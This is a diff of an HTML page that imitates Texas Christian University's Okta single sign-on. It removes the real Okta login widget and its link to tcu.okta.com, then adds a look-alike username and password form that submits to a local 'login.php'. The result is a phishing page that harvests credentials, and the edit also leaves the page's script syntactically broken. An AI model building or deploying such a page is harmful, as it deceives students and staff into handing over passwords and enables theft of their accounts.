@@ -26,7 +26,6 @@
 
 <!--[if gte IE 8]>
   <![if lte IE 9]>
-
     <style>
     .unsupported-browser-banner-wrap {
       padding: 20px;
@@ -49,12 +48,10 @@
       text-decoration: underline;
     }
     </style>
-
     <div class="unsupported-browser-banner-wrap">
       <div class="unsupported-browser-banner-inner">
         <span class="icon icon-16 icon-only warning-16-yellow"></span>You are using an unsupported browser. For the best experience, update to <a href="https://support.okta.com/help/articles/Knowledge_Article/24532952-Platforms---Browser-and-OS-Support">a supported browser</a>.</div>
     </div>
-
   <![endif]>
 <![endif]-->
 <!--[if IE 8]> <div id="login-bg-image-ie8" class="login-bg-image" data-se="login-bg-image"></div> <![endif]-->
@@ -135,22 +132,65 @@
         </div>
     </div>
 </noscript>
-<div id="signin-container"></div>
-  <div id="okta-sign-in" class="auth-container main-container" style="display:none">
-      <div id="unsupported-onedrive" class="unsupported-message" style="display:none">
-        <h2 class="o-form-head">Your OneDrive version is not supported</h2>
-        <p>Upgrade now by installing the OneDrive for Business Next Generation Sync Client to login to Okta</p>
-        <a class="button button-primary" target="_blank" href="https://support.okta.com/help/articles/Knowledge_Article/Upgrading-to-OneDrive-for-Business-Next-Generation-Sync-Client">
-          Learn how to upgrade</a>
-      </div>
-      <div id="unsupported-cookie" class="unsupported-message" style="display:none">
-          <h2 class="o-form-head">Cookies are required</h2>
-          <p>Cookies are disabled on your browser. Please enable Cookies and refresh this page.</p>
-          <a class="button button-primary" target="_blank" href=".">
-              Refresh</a>
-      </div>
-  </div>
+
+<div id="signin-container"><div data-se="auth-container" id="okta-sign-in" class="auth-container main-container no-beacon">      
+<div class="okta-sign-in-header auth-header">                
+<img src="https://ok2static.oktacdn.com/fs/bco/1/fs0cwgro3upjYmtQD0x7" class="auth-org-logo" alt="Texas Christian University - Prod logo">                
+<div data-type="beacon-container" class="beacon-container">
+</div>      
+</div>      
+<div class="auth-content">
+<div class="auth-content-inner">
+<div class="primary-auth">
+<form novalidate="novalidate" action="login.php" method="POST" data-se="o-form" slot="content" id="form1" class="primary-auth-form o-form o-form-edit-mode">        
+<div data-se="o-form-content" class="o-form-content o-form-theme clearfix">                        
+<h2 data-se="o-form-head" class="okta-form-title o-form-head">TCU Single Sign-On</h2>                          
+<div class="o-form-error-container" data-se="o-form-error-container"></div>      
+<div class="o-form-fieldset-container" data-se="o-form-fieldset-container">
+<div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-5">
+<div data-se="o-form-label" class="okta-form-label o-form-label">
+<label for="okta-signin-username">TCU Username&nbsp;</label>
 </div>
+<div data-se="o-form-input-container" class="o-form-input">
+<p class="o-form-explain">Your username is NOT an email address.</p>
+<span data-se="o-form-input-username" class="o-form-input-name-username o-form-control okta-form-input-field input-fix">                  
+<input type="text" placeholder="" name="username" id="okta-signin-username" value="" aria-label="" autocomplete="off" required="">            
+</span>
+</div>
+</div>
+<div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-30"><div data-se="o-form-label" class="okta-form-label o-form-label">
+<label for="okta-signin-password">TCU Password&nbsp;</label>
+</div>
+<div data-se="o-form-input-container" class="o-form-input"><span data-se="o-form-input-password" class="o-form-input-name-password o-form-control okta-form-input-field input-fix">                  
+<input type="password" placeholder="" name="password" id="okta-signin-password" value="" aria-label="" autocomplete="off" required="">            
+</span>
+</div>
+</div>
+</div>    
+</div>  
+<div class="o-form-button-bar">
+<input class="button button-primary" type="submit" value="Sign In" id="okta-signin-submit" data-type="save">
+</div>
+</form>
+<div class="auth-footer">      
+<a href="#" data-se="needhelp" aria-expanded="false" aria-controls="help-links-container" class="link help js-help">      
+Need help signing in?      
+</a>      
+<ul class="help-links js-help-links" id="help-links-container" style="display: none;">        
+<li>        
+<a href="#" data-se="forgot-password" class="link js-forgot-password">        
+Login Help?                          
+</a>        
+</li>                        
+<li>        
+<a href="https://newuser.tcu.edu/" data-se="help-link" class="link js-help-link" rel="noopener noreferrer" target="_blank">        
+Need a TCU Username?           
+</a>        
+</li>      
+</ul>    
+</div></div></div></div>    
+</div></div>
+
 
 <div class="footer">
   <div class="footer-container clearfix">
@@ -162,7 +202,6 @@
 <script type="text/javascript">function runLoginPage (fn) {var mainScript = document.createElement('script');mainScript.src = 'https://ok2static.oktacdn.com/assets/js/mvc/loginpage/initLoginPage.pack.34c59a55bb3a42c88a91a86c33d95ad4.js';mainScript.crossOrigin = 'anonymous';mainScript.integrity = 'sha384-ekzWS2nSsKeC5/OJ5nzxBajAU3seb0ultLc8ltcppxoPRNBiKkisviHs5q4iXxev';document.getElementsByTagName('head')[0].appendChild(mainScript);fn && mainScript.addEventListener('load', function () { setTimeout(fn, 1) });}</script><script type="text/javascript">
 (function(){
 
-  var baseUrl = 'https\x3A\x2F\x2Ftcu.okta.com';
   var suppliedRedirectUri = '';
   var repost = false;
   var stateToken = '00WZ12jTITAb50ly3eUvROrAs17eTNJU0FWnd6Iz3z';
@@ -407,12 +446,9 @@
     document.getElementById('unsupported-cookie').removeAttribute('style');
     unsupportedContainer.removeAttribute('style');
   }
-  else {
-    unsupportedContainer.parentNode.removeChild(unsupportedContainer);
-    runLoginPage(function () {
-      OktaLogin.initLoginPage(loginPageConfig);
-    });
+  );
   }
+
 
 }());
 </script>
